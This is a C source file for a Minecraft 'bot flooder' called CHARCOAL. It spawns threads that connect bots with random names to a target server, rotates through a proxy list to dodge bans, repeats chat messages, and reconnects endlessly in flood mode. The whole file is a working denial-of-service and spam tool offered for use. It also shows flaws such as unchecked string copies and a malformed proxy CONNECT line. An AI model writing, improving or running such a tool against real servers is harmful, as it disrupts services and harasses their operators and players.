#include <sys/socket.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <pthread.h>
#include <strings.h>
#include <math.h>
#include <ctype.h>

#include "protocol.c"
#include "utils.c"
#include "proxies.c"

#define MODE_STAY 0
#define MODE_FLOOD 1

int protocol;
int mode = MODE_FLOOD;

void bot_connect(char *address, int port, char *username, int thread, char *message, char *proxy_address, int proxy_port) {
    struct sockaddr_in server;
    int sock;

    char *conn_address = strdup(address);
    int conn_port = port;

    if(!ipaddress_valid(conn_address)) {
        char ip[16];
        if(resolve_hostname(conn_address, ip)) {
            free(conn_address);
            conn_address = strdup(ip);
        }else {
            fprintf(stderr, "[%sERROR%s][%sTHREAD%03d%s] Invalid IP address or hostname\n", COLOR_RED, COLOR_RESET, COLOR_BLUE, thread, COLOR_RESET);
            exit(1);
        }
    }

    if((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        fprintf(stderr, "[%sERROR%s][%sTHREAD%03d%s] Unable to initialize socket\n", COLOR_RED, COLOR_RESET, COLOR_BLUE, thread, COLOR_RESET);
        return;
    }
    
    server.sin_family = AF_INET;
    server.sin_port = htons(proxy_port == -1 ? conn_port : proxy_port);

    if(!inet_pton(AF_INET, proxy_port == -1 ? conn_address : proxy_address, &server.sin_addr)) {
        fprintf(stderr, "[%sERROR%s][%sTHREAD%03d%s] Unable to resolve IP address '%s'\n", COLOR_RED, COLOR_RESET, COLOR_BLUE, thread, COLOR_RESET, conn_address);
        exit(1);
    }

    if((connect(sock, (struct sockaddr*)&server, sizeof(server))) < 0) {
        fprintf(stderr, "[%sERROR%s][%sTHREAD%03d%s] Unable to connect to server\n", COLOR_RED, COLOR_RESET, COLOR_BLUE, thread, COLOR_RESET);
        if(proxy_port == -1) {
            exit(1);
        }else {
            return;
        }
    }

    char proxy_str[256];
    bzero(proxy_str, 256);
    if(proxy_port != -1) {
        sprintf(proxy_str, " with proxy %s:%d", proxy_address, proxy_port);
    }
    printf("[%sINFO%s][%sTHREAD%03d%s] Bot '%s' connecting%s\n", COLOR_GREEN, COLOR_RESET, COLOR_BLUE, thread, COLOR_RESET, username, proxy_str);

    char *packet;
    int packet_size = 0;

    if(proxy_port != -1) {
        char https[256];
        sprintf(https, "CONNECT %s:%d HTTP/1.1\r\n\r\n", proxy_address, proxy_port);
        send(sock, https, strlen(https), 2);
    }

    ping_packet(address, port, 2, &packet, &packet_size);
    send(sock, packet, packet_size, 2);
    join_packet(username, &packet, &packet_size);
    send(sock, packet, packet_size, 2);
    
    free(conn_address);
    packet = NULL;

    while(1) {
        if(strlen(message) > 0) {
            if(packet == NULL) {
                chat_message_packet(message, &packet, &packet_size);
            }
            send(sock, packet, packet_size, 2);
        }
        sleep(1);
        if(mode == MODE_FLOOD) {
            break;
        }
        if(!send(sock, "\0", 1, 2) || !read(sock, NULL, 1024)) {
            printf("[%sINFO%s][%sTHREAD%03d%s] Connection closed\n", COLOR_GREEN, COLOR_RESET, COLOR_BLUE, thread, COLOR_RESET);
        }
    }

    close(sock);
}

struct args {
    char *address;
    int port;
    int thread;
    char **proxies;
    int proxy_amount;
    char *message;
};

void *bot_loop(void *args) {
    char proxy_addr[16];
    int proxy_port = -1;
    while(1) {
        if((((struct args *)args)->proxy_amount) > 0) {
            char *selected_proxy = (((struct args *)args)->proxies)[rand() % (((struct args *)args)->proxy_amount)];
            parse_proxy(selected_proxy, proxy_addr, &proxy_port);
            if(proxy_port == -1 || !ipaddress_valid(proxy_addr)) {
                continue;
            }
        }
        bot_connect(
            ((struct args *)args)->address,
            ((struct args *)args)->port,
            random_string(10),
            ((struct args *)args)->thread,
            ((struct args *)args)->message,
            proxy_addr,
            proxy_port
        );
    }
    return 0;
}

void print_help(char *executable) {
    printf("usage: %s -i address [-p port] [-t thread number] [-x proxy file] [-m mode] [-c message] [-v protocol version]\n", executable);
    exit(1);
}

int main(int argc, char *argv[]) {
    printf(">>>>> %sCHARCOAL%s for Minecraft (github.com/gcrbr)\n\n", COLOR_CHARCOAL, COLOR_RESET);

    protocol = 47;

    int thread_number = 10;
    char address[256];
    int port = 25565;
    char proxy_file[256];
    char message[256];

    init_random();

    int opt;
    while((opt = getopt(argc, argv, "i:p:t:x:m:v:c:h")) != -1) {
        switch(opt) {
            case 'i':
                strcpy(address, optarg);
                break;
            case 'p':
                if(!(port = atoi(optarg))) {
                    fprintf(stderr, "[%sERROR%s] Invalid port number\n", COLOR_RED, COLOR_RESET);
                    exit(1);
                }
                break;
            case 't':
                if(!(thread_number = atoi(optarg))) {
                    fprintf(stderr, "[%sERROR%s] Invalid number of threads\n", COLOR_RED, COLOR_RESET);
                    exit(1);
                }
                break;
            case 'x':
                strcpy(proxy_file, optarg);
                break;
            case 'c':
                strcpy(message, optarg);
                break;
            case 'v':
                if(!(protocol = atoi(optarg)) || protocol == 1) {
                    if(!(protocol = get_protocol_by_version(optarg))) {
                        fprintf(stderr, "[%sERROR%s] Invalid protocol number '%s'\n", COLOR_RED, COLOR_RESET, optarg);
                        exit(1);
                    }
                }
                break;
            case 'm':
                strtolower(optarg);
                if(!strcmp(optarg, "stay")) {
                    mode = MODE_STAY;
                }else if(!strcmp(optarg, "flood")) {
                    mode = MODE_FLOOD;
                }else {
                    fprintf(stderr, "[%sERROR%s] Invalid mode '%s', available modes: STAY, FLOOD\n", COLOR_RED, COLOR_RESET, optarg);
                    exit(1);
                }
                break;
            case 'h':
                print_help(argv[0]);
                break;
            default:
                print_help(argv[0]);
                break;
        }
    }

    if(strlen(address) == 0) {
        print_help(argv[0]);
    }

    char **proxies;
    int proxy_amount = -1;
    if(strlen(proxy_file) > 0) {
        read_proxy_file(proxy_file, &proxies, &proxy_amount);
    }

    pthread_t threads[thread_number];
    
    for(int i=0; i < thread_number; ++i) {
        struct args *func_args = (struct args *)malloc(sizeof(struct args));
        func_args->address = address;
        func_args->port = port;
        func_args->thread = i+1;
        func_args->proxies = proxies;
        func_args->proxy_amount = proxy_amount;
        func_args->message = message;
        if(pthread_create(&threads[i], NULL, bot_loop, (void *)func_args) != 0) {
            threads[i] = NULL;
        }
    }

    for(int i=0; i < thread_number; ++i) {
        if(threads[i] != NULL) {
            pthread_join(threads[i], NULL);
        }
    }
}